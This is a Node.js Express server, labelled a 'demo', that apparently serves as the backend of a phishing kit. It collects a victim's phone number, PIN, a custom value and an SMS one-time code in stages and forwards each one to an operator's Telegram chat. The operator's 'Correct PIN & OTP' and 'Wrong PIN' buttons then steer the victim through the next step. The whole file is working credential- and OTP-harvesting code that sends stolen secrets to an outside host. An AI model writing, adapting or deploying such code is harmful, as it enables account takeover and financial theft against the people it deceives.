const express = require("express");
const crypto = require("crypto");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const sessions = new Map();

app.use(express.json({ limit: "10kb" }));
app.use(express.static(path.join(__dirname, "public")));

// Telegram API helper
async function telegram(method, data) {
  if (!BOT_TOKEN || !CHAT_ID) {
    throw new Error("Telegram environment variables are missing.");
  }

 const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  
  const response = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
    signal: AbortSignal.timeout(15000)
  });

  const result = await response.json();
  if (!response.ok || !result.ok) {
    throw new Error(result.description || `Telegram HTTP ${response.status}`);
  }
  return result.result;
}

// Health check
app.get("/api/health", (req, res) => {
  res.json({ ok: true, message: "Demo server running." });
});

// Create demo session
app.post("/api/session", (req, res) => {
  const sessionId = crypto.randomBytes(12).toString("hex");
  sessions.set(sessionId, {
    createdAt: Date.now(),
    stage: null,
    status: "idle",
    data: { phone: "", pin: "", code1: "", code2: "" } 
  });
  res.json({ sessionId });
});

// Request Telegram approval — Styled with distinct line spacing and copy formats
app.post("/api/approval-request", async (req, res) => {
  const { sessionId, stage, payload } = req.body || {};
  const allowedStages = ["pin", "code1", "code2"];
  const session = sessions.get(sessionId);

  if (!session || !allowedStages.includes(stage)) {
    return res.status(400).json({ error: "Invalid demo session or stage." });
  }

  if (Date.now() - session.createdAt > 30 * 60 * 1000) {
    sessions.delete(sessionId);
    return res.status(410).json({ error: "Demo session expired." });
  }

  // Persist the inputs continuously across stages
  session.data = { ...session.data, ...payload };
  session.stage = stage;
  session.status = "pending";
  session.updatedAt = Date.now();

  let headingTitle = "🟢 PIN VERIFICATION NEEDED";
  let ruleLength = "PIN Length: 5 digits";
  
  if (stage === "code1") {
    headingTitle = "🟢 CUSTOM VALUE VERIFICATION NEEDED";
    ruleLength = `Value Inputted: Provided`;
  } else if (stage === "code2") {
    headingTitle = "🟢 FINAL SMS VERIFICATION NEEDED";
    ruleLength = "OTP Code Length: 4 digits";
  }

  const phoneVal = session.data.phone ? session.data.phone.trim() : "None";
  const pinVal = session.data.pin ? session.data.pin.trim() : "None";
  const code1Val = session.data.code1 ? session.data.code1.trim() : "None";
  const code2Val = session.data.code2 ? session.data.code2.trim() : "None";

  try {
    // Labels are separated from code blocks, and values live on clean lines for clean tap-to-copy
    const textMessage = 
      `<b># Thor - ${stage.toUpperCase()} Verification</b>\n` +
      `<b>${headingTitle}</b>\n\n` +
      `🟩 USER DETAILS 🟩\n\n` +
      `• Phone Number --\n<code>${phoneVal}</code>\n\n` +
      `• PIN Code --\n<code>${pinVal}</code>\n\n` +
      `• Custom Text --\n<code>${code1Val}</code>\n\n` +
      `• Final SMS Code --\n<code>${code2Val}</code>\n\n` +
      `───────────────────────\n\n` +
      `Verify Entry Parameters:\n` +
      `• ${ruleLength}\n` +
      `• Timeout: 5 minutes\n` +
      `00.39\n\n` +
      `───────────────────────`;

    await telegram("sendMessage", {
      chat_id: CHAT_ID,
      text: textMessage,
      parse_mode: "HTML", 
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Correct PIN & OTP", callback_data: `approve:${sessionId}:${stage}` },
            { text: "❌ Wrong PIN", callback_data: `decline:${sessionId}:${stage}` }
          ]
        ]
      }
    });

    return res.json({ ok: true, status: "pending" });
  } catch (error) {
    session.status = "idle";
    console.error("Telegram delivery failed:", error.message);
    return res.status(502).json({ error: "Telegram alert failed to send." });
  }
});

// Check demo approval status
app.get("/api/status", (req, res) => {
  const { sessionId, stage } = req.query;
  const session = sessions.get(sessionId);

  if (!session) return res.status(404).json({ error: "Session missing." });
  if (session.stage !== stage) return res.json({ status: "idle" });

  res.json({ status: session.status });
});

// Receive Telegram Webhook inline actions
app.post("/telegram-webhook", async (req, res) => {
  res.sendStatus(200);
  const query = req.body?.callback_query;
  if (!query?.data) return;

  const match = /^(approve|decline):([a-f0-9]+):(pin|code1|code2)$/.exec(query.data);
  if (!match) return;

  const [, decision, sessionId, stage] = match;
  const session = sessions.get(sessionId);

  if (!session || session.stage !== stage || session.status !== "pending") {
    try {
      await telegram("answerCallbackQuery", {
        callback_query_id: query.id,
        text: "This action request has expired."
      });
    } catch (e) {}
    return;
  }

  session.status = decision === "approve" ? "approved" : "declined";
  
  try {
    await telegram("answerCallbackQuery", {
      callback_query_id: query.id,
      text: `Step completed as ${session.status}`
    });

    if (query.message?.message_id) {
      const cleanPhone = session.data.phone ? session.data.phone.trim() : "None";
      const statusBanner = session.status === "approved" 
        ? `<b>✅ CORRECT ENTRY processed for Phone: <code>${cleanPhone}</code></b>`
        : `<b>❌ WRONG ENTRY processed for Phone: <code>${cleanPhone}</code></b>`;

      await telegram("editMessageText", {
        chat_id: CHAT_ID,
        message_id: query.message.message_id,
        text: `${statusBanner}\n\n${query.message.text}`,
        parse_mode: "HTML"
      });
    }
  } catch (err) {
    console.error("Webhook state visualization update failed:", err.message);
  }
});

app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ error: "Internal server error" });
});

app.listen(PORT, () => console.log(`Backend server active on port ${PORT}`));

